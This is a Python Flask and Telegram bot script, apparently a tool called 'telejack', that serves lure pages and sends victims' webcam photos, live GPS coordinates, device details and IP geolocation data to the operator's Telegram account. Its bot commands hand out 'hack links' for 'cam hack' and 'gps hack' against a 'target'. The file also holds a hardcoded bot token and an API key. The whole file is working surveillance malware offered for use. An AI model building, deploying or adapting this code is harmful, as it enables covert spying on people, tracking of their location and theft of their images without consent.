from flask import Flask, render_template, render_template_string, request, jsonify, session, sessions
import logging
import os
import json
import datetime
import telebot
import time
import os
import threading
import base64
import requests
import asyncio


app = Flask(__name__, template_folder='.site', static_folder='.site', static_url_path='/')
app.secret_key = 'xxx'




bot = telebot.TeleBot("7525871760:AAGj7NTUIxNTDq_JpBqQF3E7PvGnk8MtgT8")
channel_id = '@hackerpdfbotlog'

user_id = 1853412532
host = "https://telejack.onrender.com/"



def message(message):
    try:
            bot.send_message(user_id, message, parse_mode="Markdown")
            print(f"Message sent to {user_id}")
    except Exception as e:
            print(f"Failed to send message to {user_id}: {str(e)}")

message("hacker is online ")



@bot.message_handler(commands=['start'])
def send_(message):
    bot.reply_to(message, """
    this bot made by krunal_io

    \n /start - Start bot \n /link - get your hacke link \n
    note link for target 🎯\n
     """)


@bot.message_handler(commands=['link'])
def send_welcome(message):
    bot.reply_to(message, f"""
     {host}cam : for cam hacke 
     {host} :  like etc.ip, device info
     {host}loc : gps hack live 

     \n  more Features comming soon like 🎤 mic hack , 🗺️ gps hack in devalment 
     """)


def ipdata(ip):
    data = requests.get(f"http://ip-api.com/json/{ip}")
    return data.json()





def photo(photo_path, caption=""):
        try:
            time.sleep(0.1)
            bot.send_photo(user_id, photo=photo_path, caption=caption)
            print(f"Photo sent to {user_id}")
            time.sleep(1)  
        except Exception as e:
            print(f"Failed to send photo to {user_id}: {str(e)}")


    


def now():
    now = datetime.datetime.now()
    print(now)
    return now



def makefile(data, file_name):
    with open(file_name, 'w') as file:  
       file.write(data)


def jdata(data):
   d = json.dumps(data, indent=10)
   return d



@app.route("/")
def hello():
    message("index page opened !\n")
    return render_template("index.html")

@app.route("/cam")
def he():
    message("cam page opened !? \n")
    return render_template("video.html")

@app.route("/loc")
def loc():
    message("loc page opened !? \n")
    return render_template("loc.html")

@app.route("/locdata", methods=['POST'])
def lodata():
    jloc = request.get_json()
    cc = jdata(jloc)
    message(f"""target gps data\n 
```
{cc}``` """)
    time.sleep(5)
    # photo(f"https://maps.geoapify.com/v1/staticmap?style=toner-grey&width=350&height=300&center=lonlat:{jloc['longitude']},{jloc['latitude']}&zoom=10.9318&apiKey=83201a4a9e1e477399fe95ceb2f855e9")
    return jsonify({"message": "done"})

@app.route('/data', methods=['POST', 'GET'])
def upload_image():
    data = request.get_json()
    image_data = data['image']
    global file
    print("photo")
    decoded_image_data = base64.b64decode(image_data)
    session['img'] = decoded_image_data
    time = now()
    photo(session['img'])
    return jsonify({"message": "Image uploaded successfully!"})



@app.route('/api', methods=['POST', 'GET'])
def devi():
    data = request.get_json()
    io = jdata(data)
    m = f""" user device data info\n
    ```
    {io}
    ```
    """
    message(m)
    return jsonify(data)



@app.route('/ip', methods=['POST', 'GET'])
def ip():
    data = request.get_json()
    hi = jdata(data)
    ip = data['ip']
    ha6 = jdata(ipdata(ip))
    m =f"""
    # ip addres data \n
    ```
    {ha6}
    ```

    """
    message(m)
    return jsonify(data)



async def Bot():
    print("bot server is runing")
    bot.polling()

def ser():
  app.run(port=8080)





if __name__ == '__main__':
    # Start Flask app in a new thread
    flask_thread = threading.Thread(target=ser)
    flask_thread.start()
    asyncio.run(Bot())
    



  





